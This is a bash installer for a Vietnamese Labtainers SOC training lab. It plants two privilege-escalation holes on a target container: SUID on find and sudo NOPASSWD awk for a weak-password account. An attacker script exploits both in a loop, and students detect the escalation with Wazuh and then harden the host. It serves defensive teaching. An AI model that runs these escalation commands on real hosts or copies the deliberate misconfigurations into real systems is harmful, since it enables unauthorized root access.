#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-privesc (Leo thang dac quyen -> hardening) tren VM Labtainers.
# Chay tren VM:  bash install-soc-privesc.sh
# Sau do:        cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-privesc
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-privesc
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong vong lap leo quyen ngam.
setsid bash /home/ubuntu/attack.sh >/home/ubuntu/attack.log 2>&1 < /dev/null &
exit 0
__EOF_PE_3w8n__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/attack.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Ke tan cong da chiem tai khoan thuong 'devuser'. Dinh ky SSH vao va LEO LEN ROOT
# qua 2 duong: (1) SUID /usr/bin/find, (2) sudo NOPASSWD awk. Ghi bang chung lam SIEM phat hien.
TARGET=target
DUSER=devuser
DPW=devpass123
OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
-o PreferredAuthentications=password -o PubkeyAuthentication=no"

run() { sshpass -p "$DPW" ssh $OPTS "$DUSER@$TARGET" "$1" 2>/dev/null; }

# Cho sshd target san sang
for i in $(seq 1 60); do
  timeout 3 bash -c "echo > /dev/tcp/${TARGET}/22" 2>/dev/null && break
  sleep 2
done

while true; do
  # --- Duong 1: SUID find -> chay lenh voi quyen root ---
  run "find /etc/hostname -exec /bin/bash -p -c 'id>/tmp/.rootproof1 2>/dev/null;chmod 644 /tmp/.rootproof1 2>/dev/null;echo suid_find>>/root/.pwned 2>/dev/null' \\;"
  # --- Duong 2: sudo NOPASSWD awk -> system() chay shell root ---
  run "sudo -n awk 'BEGIN{system(\"id>/tmp/.rootproof2 2>/dev/null;chmod 644 /tmp/.rootproof2 2>/dev/null;echo sudo_awk>>/root/.pwned 2>/dev/null\")}'"
  sleep 30
done
__EOF_PE_3w8n__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_PE_3w8n__'
SOC Lab - Leo thang dac quyen (Privilege Escalation) & Hardening.
May target co 2 loi cau hinh cho phep leo len root: SUID tren /usr/bin/find va
sudo NOPASSWD tren awk cho tai khoan devuser (da bi chiem). Ke tan cong dung chung
de chiem root. Nhiem vu: dieu tra qua SIEM, phat hien ca 2 duong leo quyen va va chung.
__EOF_PE_3w8n__
mkdir -p "$LAB/config"
cat > "$LAB/config/parameter.config" <<'__EOF_PE_3w8n__'
# parameter.config
# Lab nay KHONG ca nhan hoa (chong chep dua vao qua trinh dieu tra + hardening nhieu buoc).
# Van giu file nay (du khong co tham so) vi Labtainers yeu cau config/parameter.config ton tai.
__EOF_PE_3w8n__
mkdir -p "$LAB/config"
cat > "$LAB/config/start.config" <<'__EOF_PE_3w8n__'
# start.config - Lab soc-privesc (Leo thang dac quyen -> dieu tra -> hardening)
# target co 2 lo hong privesc (SUID find + sudo NOPASSWD awk). Tai khoan devuser bi chiem.
# attacker (an) dung foothold devuser de leo len root. Hoc vien san vet qua SIEM roi va ca 2.

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-privesc_student_master_seed
	GRADE_CONTAINER target

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- May nan nhan: co 2 lo hong leo quyen, noi hoc vien dieu tra + va ---
CONTAINER target
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	TERMINALS 1

# --- Ke tan cong: dung foothold devuser leo quyen root, chay ngam ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST target:172.20.0.10
	TERMINALS 0

# --- SIEM: chay Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram analyst, Firefox xem dashboard + SSH hardening ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_PE_3w8n__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_PE_3w8n__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.attacker.student" <<'__EOF_PE_3w8n__'
#
# Labtainer Dockerfile - attacker (leo quyen qua foothold devuser, an)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# sshpass: SSH khong tuong tac bang mat khau devuser
RUN apt-get update && apt-get install -y --no-install-recommends sshpass \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PE_3w8n__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.defender.student" <<'__EOF_PE_3w8n__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PE_3w8n__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.siem.student" <<'__EOF_PE_3w8n__'
#
# Labtainer Dockerfile - siem (chay Wazuh: indexer + server + dashboard)
#
ARG registry
FROM $registry/labtainer.base2
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cong cu cho bake + cai offline (setcap = libcap2-bin)
RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
    && rm -rf /var/lib/apt/lists/*
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# --- PRE-BAKE: tai goi Wazuh + tao chung chi luc BUILD (de first-boot cai OFFLINE) ---
RUN mkdir -p /root/wz && cd /root/wz \
 && curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh \
 && bash wazuh-install.sh -dw deb -da amd64 \
 && curl -sO https://packages.wazuh.com/4.14/config.yml \
 && sed -i 's/<[a-z0-9-]*-ip>/127.0.0.1/g' config.yml \
 && bash wazuh-install.sh -g
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PE_3w8n__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.target.student" <<'__EOF_PE_3w8n__'
#
# Labtainer Dockerfile - target (2 lo hong leo quyen + Wazuh agent)
#
ARG registry
# Base co openssh-server (sshd) + rsyslog -> devuser/analyst SSH duoc
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cho prestop doc sudoers (440 root) khong mat khau
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/bin/grep, /bin/grep, /usr/bin/cat, /bin/cat' > /etc/sudoers.d/labtainer-pe \
    && chmod 440 /etc/sudoers.d/labtainer-pe
#
# Dam bao co sudo, findutils (find), mawk (awk)
RUN apt-get update && apt-get install -y --no-install-recommends sudo findutils mawk \
    && rm -rf /var/lib/apt/lists/* || true
#
# --- Wazuh agent (bake, tro ve manager 172.20.0.20) ---
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent
RUN systemctl enable wazuh-agent
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PE_3w8n__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_PE_3w8n__'
=== SOC Lab: Leo thang dac quyen (Privilege Escalation) -> dieu tra -> Hardening ===

May "target" co tai khoan thuong 'devuser' DA BI CHIEM. Ke tan cong dung foothold do de
LEO LEN ROOT qua 2 loi cau hinh, va dinh ky chiem lai. Ban phai SAN qua SIEM, phat hien
CA HAI duong leo quyen roi VA chung de khong con leo len root duoc.

Nhiem vu: dieu tra qua Wazuh, va he thong tu tram DEFENDER.

*** Lan dau: cho siem cai Wazuh xong (~8-10'):  tail -f /var/log/wazuh-install.log ***

--- 1) San moi de doa tren dashboard (defender, Firefox tu mo) ---
  https://172.20.0.20   admin / (tren siem: sudo cat /root/wazuh-admin-credentials.txt)
  -> Integrity monitoring (FIM): thay /root/.pwned va /tmp/.rootproof* bi ghi lien tuc
     => co ke dang dat quyen ROOT. Can tim DUONG NAO cho phep leo quyen.

--- 2) Dieu tra tren target (SSH tu defender) ---
  ssh analyst@target            (mat khau: analyst)
  a. Liet ke file SUID bat thuong:
       find / -perm -4000 -type f 2>/dev/null
       -> chu y /usr/bin/find co bit SUID (BAT THUONG - GTFOBins: leo quyen duoc)
  b. Kiem tra cau hinh sudo cua tai khoan bi chiem:
       sudo cat /etc/sudoers.d/*        (tim dong NOPASSWD la)
       -> devuser duoc chay 'sudo awk' khong mat khau (awk -> system() -> shell root)
  c. Ghi bao cao: sua /home/analyst/findings.txt (dinh dang KEY=value):
       VECTOR1=/usr/bin/find
       VECTOR2=sudo awk
       TAI_KHOAN_BI_CHIEM=devuser

--- 3) Hardening: va CA HAI duong leo quyen ---
  d. Go SUID tren find:         sudo chmod u-s /usr/bin/find
  e. Xoa quyen sudo nguy hiem:  sudo rm -f /etc/sudoers.d/devuser
  f. (Nen) chan foothold:       sudo passwd -l devuser ; sudo rm -f /root/.pwned
  g. Kiem chung:
       stat -c '%a' /usr/bin/find        -> KHONG con bat dau bang 4 (vd 755)
       sudo -l -U devuser                -> khong con dong NOPASSWD awk

Xong: checkwork / stoplab.
Muc tieu: incident_resolved = Y  (da va CA HAI lo hong leo quyen).
__EOF_PE_3w8n__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_PE_3w8n__'
# goals.config - tieu chi dat/khong dat (Leo thang dac quyen)

# Phat hien / dieu tra
threat_detected  = boolean : _siem_detected
agent_connected  = boolean : _agent_connected
reported_iocs    = boolean : ( _rep1 and _rep2 )

# Hardening (va ca 2 duong leo quyen)
suid_fixed       = boolean : ( _marker and_not _suid_vuln )
sudo_fixed       = boolean : ( _marker and_not _sudo_vuln )

# MUC TIEU TONG: va CA HAI lo hong leo quyen
incident_resolved = boolean : ( _marker and_not _suid_vuln and_not _sudo_vuln )
__EOF_PE_3w8n__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/results.config" <<'__EOF_PE_3w8n__'
# results.config - trich du lieu cham diem (doc tu prestop.stdout)

_marker     = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
# LO HONG 1 con? /usr/bin/find con bit SUID (quyen 4xxx)
_suid_vuln  = target:prestop.stdout : FILE_REGEX : FIND_PERM=4[0-7][0-7][0-7]
# LO HONG 2 con? con dong sudo NOPASSWD cho devuser
_sudo_vuln  = target:prestop.stdout : FILE_REGEX : SUDORULE:
# Analyst da ghi dung 2 vector?
_rep1       = target:prestop.stdout : FILE_REGEX : VECTOR1=.*find
_rep2       = target:prestop.stdout : FILE_REGEX : VECTOR2=.*awk
# SIEM co canh bao (FIM ve /root/.pwned bi chiem)?
_siem_detected   = siem:prestop.stdout : FILE_REGEX : (syscheck|Integrity|pwned|rootproof|sudoers)
_agent_connected = siem:prestop.stdout : FILE_REGEX : target.*Active

# --- Goi y checkwork ---
#CHECK_FALSE: Van con SUID tren /usr/bin/find (leo quyen duoc). Go: sudo chmod u-s /usr/bin/find
cw_suid = target:prestop.stdout : FILE_REGEX : FIND_PERM=4[0-7][0-7][0-7]
#CHECK_FALSE: Van con sudo NOPASSWD cho devuser. Go: sudo rm /etc/sudoers.d/devuser
cw_sudo = target:prestop.stdout : FILE_REGEX : SUDORULE:
#CHECK_TRUE: Chua ghi vector 1 vao findings (vi du VECTOR1=/usr/bin/find).
cw_rep1 = target:prestop.stdout : FILE_REGEX : VECTOR1=.*find
#CHECK_TRUE: Chua ghi vector 2 vao findings (vi du VECTOR2=sudo awk).
cw_rep2 = target:prestop.stdout : FILE_REGEX : VECTOR2=.*awk
__EOF_PE_3w8n__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Lan khoi dong dau tren siem: tu cai Wazuh all-in-one o CHE DO NEN (~10-15 phut).
# $1 = mat khau sudo. Chi cai neu chua co (/var/ossec).
PW="$1"
if [ ! -d /var/ossec ]; then
  echo "$PW" | sudo -S nohup bash /home/ubuntu/wazuh-setup.sh >/dev/null 2>&1 &
fi
exit 0
__EOF_PE_3w8n__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/prestop" <<'__EOF_PE_3w8n__'
#!/bin/bash
# prestop siem: chup bang chung Wazuh phat hien leo quyen (FIM /root, /tmp, sudoers).
trap "echo Timed out; exit" SIGTERM

echo "=== wazuh alerts (FIM: /root/.pwned, rootproof, sudoers) ==="
sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null \
  | grep -iE 'syscheck|integrity|pwned|rootproof|sudoers|/root' | tail -50

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
__EOF_PE_3w8n__
mkdir -p "$LAB/siem"
cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_PE_3w8n__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
# Gieo 2 lo hong leo quyen + tai khoan devuser (bi chiem) + FIM giam sat.
PW="$1"

# ============ 1) Tai khoan devuser (bi chiem, mat khau yeu, SSH duoc) ============
echo "$PW" | sudo -S useradd -m -s /bin/bash devuser 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "devuser:devpass123" | chpasswd'
# Bat password auth cho sshd (de attacker SSH bang mat khau)
echo "$PW" | sudo -S sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
echo "$PW" | sudo -S service ssh restart 2>/dev/null || echo "$PW" | sudo -S systemctl restart ssh 2>/dev/null || true

# ============ 2) LO HONG 1: SUID root tren /usr/bin/find ============
echo "$PW" | sudo -S chmod u+s /usr/bin/find

# ============ 3) LO HONG 2: sudo NOPASSWD awk cho devuser ============
echo "$PW" | sudo -S bash -c 'echo "devuser ALL=(ALL) NOPASSWD: /usr/bin/awk" > /etc/sudoers.d/devuser; chmod 440 /etc/sudoers.d/devuser'

# ============ 4) Wazuh FIM: giam sat /root, /tmp, /etc/sudoers.d realtime ============
FIM='<directories realtime="yes" check_all="yes" report_changes="yes">/root,/tmp,/etc/sudoers.d</directories>'
echo "$PW" | sudo -S sed -i "s#<syscheck>#<syscheck>\n    ${FIM}#" /var/ossec/etc/ossec.conf 2>/dev/null
echo "$PW" | sudo -S systemctl restart wazuh-agent 2>/dev/null || echo "$PW" | sudo -S service wazuh-agent restart 2>/dev/null || true

# ============ 5) Tai khoan analyst cho DEFENDER SSH sang hardening ============
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null
cat > /tmp/findings.txt <<'FND'
# BAO CAO DIEU TRA - dien gia tri ban tim duoc (giu dinh dang KEY=value):
VECTOR1=
VECTOR2=
TAI_KHOAN_BI_CHIEM=
FND
echo "$PW" | sudo -S cp /tmp/findings.txt /home/analyst/findings.txt
echo "$PW" | sudo -S chown analyst:analyst /home/analyst/findings.txt
echo "$PW" | sudo -S chmod 644 /home/analyst/findings.txt

exit 0
__EOF_PE_3w8n__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/prestop" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (dung cham diem).
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER"

# LO HONG 1: /usr/bin/find con SUID? (4xxx = con bit SUID) - world-readable, khong can sudo
echo "FIND_PERM=$(stat -c '%a' /usr/bin/find 2>/dev/null)"

# LO HONG 2: con dong sudo NOPASSWD cho devuser khong?
sudo -n grep -rhiE 'NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null | grep -i devuser | sed 's/^/SUDORULE: /'

echo "=== bang chung leo quyen (proof, world-readable) ==="
echo "ROOTPROOF1:"; cat /tmp/.rootproof1 2>/dev/null
echo "ROOTPROOF2:"; cat /tmp/.rootproof2 2>/dev/null

echo "=== cac file SUID bat thuong (tham khao) ==="
find /usr/bin /bin -perm -4000 -type f 2>/dev/null | sed 's/^/SUIDFILE: /'

echo "=== findings.txt (bao cao analyst) ==="
cat /home/analyst/findings.txt 2>/dev/null

echo "=== (GV) IOC that: SUID /usr/bin/find ; sudo NOPASSWD awk (devuser) ==="
__EOF_PE_3w8n__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/treataslocal" <<'__EOF_PE_3w8n__'
wazuh-agent
sudo
__EOF_PE_3w8n__

echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/attacker/*.sh "$LAB"/target/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh "$LAB"/siem/*.sh 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-privesc"
